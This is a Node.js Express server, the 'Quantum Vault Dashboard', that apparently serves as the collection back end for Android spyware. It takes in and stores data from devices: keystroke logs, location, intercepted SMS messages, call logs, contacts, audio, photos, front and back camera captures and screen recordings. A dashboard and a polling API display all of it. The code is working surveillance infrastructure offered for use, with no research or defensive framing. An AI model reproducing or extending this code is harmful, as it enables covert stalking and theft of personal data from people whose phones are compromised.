const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const moment = require('moment');

const app = express();
const PORT = 5000;

// ─── Directory Setup ──────────────────────────────────────────────────────────
const uploadDirs = ['audios', 'contacts', 'photos', 'videos', 'others',
                    'front_photos', 'back_photos', 'screen_recordings'];
uploadDirs.forEach(dir => {
    const dirPath = path.join(__dirname, 'uploads', dir);
    if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true });
});

// ─── Data Store ───────────────────────────────────────────────────────────────
const dataFile = path.join(__dirname, 'data.json');
const defaultData = { texts: [], sms: [], files: [], call_logs: [] };
if (!fs.existsSync(dataFile)) {
    fs.writeFileSync(dataFile, JSON.stringify(defaultData, null, 2));
} else {
    // Migrate old data.json to include call_logs if missing
    try {
        const existing = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
        if (!existing.call_logs) {
            existing.call_logs = [];
            fs.writeFileSync(dataFile, JSON.stringify(existing, null, 2));
        }
    } catch (e) {
        fs.writeFileSync(dataFile, JSON.stringify(defaultData, null, 2));
    }
}

const readData = () => {
    try { return JSON.parse(fs.readFileSync(dataFile, 'utf8')); }
    catch (e) { return { ...defaultData }; }
};
const writeData = (data) => fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));

// ─── Middleware ───────────────────────────────────────────────────────────────
app.use(cors());
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Raw body handler for binary file uploads (octet-stream)
const FOLDER_MAP = {
    '/upload_audios':           'audios',
    '/upload_contacts':         'contacts',
    '/upload_photos':           'photos',
    '/upload_videos':           'videos',
    '/upload_front_photo':      'front_photos',
    '/upload_back_photo':       'back_photos',
    '/upload_screen_recording': 'screen_recordings',
};

const rawBodySaver = (req, res, next) => {
    if (req.headers['content-type'] === 'application/octet-stream') {
        let filename = 'unknown_file';
        const disposition = req.headers['content-disposition'];
        if (disposition && disposition.includes('filename="')) {
            filename = disposition.split('filename="')[1].split('"')[0];
        }

        const folder = FOLDER_MAP[req.path] || 'others';
        const savedName = Date.now() + '_' + filename;
        const filePath = path.join(__dirname, 'uploads', folder, savedName);
        const writeStream = fs.createWriteStream(filePath);
        req.pipe(writeStream);

        req.on('end', () => {
            const db = readData();
            db.files.push({
                filename,
                path: `/uploads/${folder}/${savedName}`,
                type: folder,
                deviceId: req.headers['device-id'] || 'Unknown',
                timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
            });
            if (db.files.length > 1000) db.files.shift();
            writeData(db);
            res.status(200).send('File Uploaded');
        });
        req.on('error', (err) => {
            console.error('File upload error:', err);
            res.status(500).send('Error uploading file');
        });
    } else {
        next();
    }
};

app.use(rawBodySaver);
app.use(bodyParser.json({ limit: '10mb' }));

// ─── Endpoints ────────────────────────────────────────────────────────────────

// Text / Keylogs / Location / SMS History
app.post('/upload_text', (req, res) => {
    const { type, data } = req.body;
    const deviceId = req.headers['device-id'] || 'Unknown';
    const db = readData();
    db.texts.push({
        type: type || 'Log',
        data: data || '',
        deviceId,
        timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
    });
    if (db.texts.length > 2000) db.texts.shift();
    writeData(db);
    console.log(`[TEXT] [${deviceId}] type=${type} len=${(data||'').length}`);
    res.status(200).send('Text logged');
});

// Live SMS intercepts
app.post('/upload_sms', (req, res) => {
    const { sender, message, timestamp } = req.body;
    const deviceId = req.headers['device-id'] || 'Unknown';
    const db = readData();
    db.sms.push({
        sender: sender || 'Unknown',
        message: message || '',
        original_timestamp: timestamp,
        deviceId,
        timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
    });
    if (db.sms.length > 500) db.sms.shift();
    writeData(db);
    console.log(`[SMS] [${deviceId}] from=${sender}`);
    res.status(200).send('SMS logged');
});

// Call logs (JSON string in data field)
app.post('/upload_call_logs', (req, res) => {
    const { data } = req.body;
    const deviceId = req.headers['device-id'] || 'Unknown';
    const db = readData();
    db.call_logs.push({
        data: data || '[]',
        deviceId,
        timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
    });
    if (db.call_logs.length > 50) db.call_logs.shift();
    writeData(db);
    console.log(`[CALL_LOGS] [${deviceId}]`);
    res.status(200).send('Call logs saved');
});

// Binary file upload route stubs (handled by rawBodySaver above)
app.post('/upload_audios',           (req, res) => res.status(200).send('ok'));
app.post('/upload_contacts',         (req, res) => res.status(200).send('ok'));
app.post('/upload_photos',           (req, res) => res.status(200).send('ok'));
app.post('/upload_videos',           (req, res) => res.status(200).send('ok'));
app.post('/upload_front_photo',      (req, res) => res.status(200).send('ok'));
app.post('/upload_back_photo',       (req, res) => res.status(200).send('ok'));
app.post('/upload_screen_recording', (req, res) => res.status(200).send('ok'));

// API endpoint for live polling (no page reload)
app.get('/api/data', (req, res) => {
    const db = readData();
    res.json({
        texts:       [...db.texts].reverse().slice(0, 200),
        sms:         [...db.sms].reverse().slice(0, 200),
        files:       [...db.files].reverse().slice(0, 200),
        call_logs:   [...db.call_logs].reverse().slice(0, 50),
    });
});

// Dashboard
app.get('/', (req, res) => {
    const db = readData();
    const viewData = {
        texts:     [...db.texts].reverse(),
        sms:       [...db.sms].reverse(),
        files:     [...db.files].reverse(),
        call_logs: [...db.call_logs].reverse(),
    };
    res.render('index', { data: viewData });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Quantum Vault Dashboard → http://localhost:${PORT}`);
    console.log(`   For real devices on LAN  → http://<YOUR-PC-IP>:${PORT}`);
    console.log(`   Android Emulator reaches → http://10.0.2.2:${PORT}`);
});
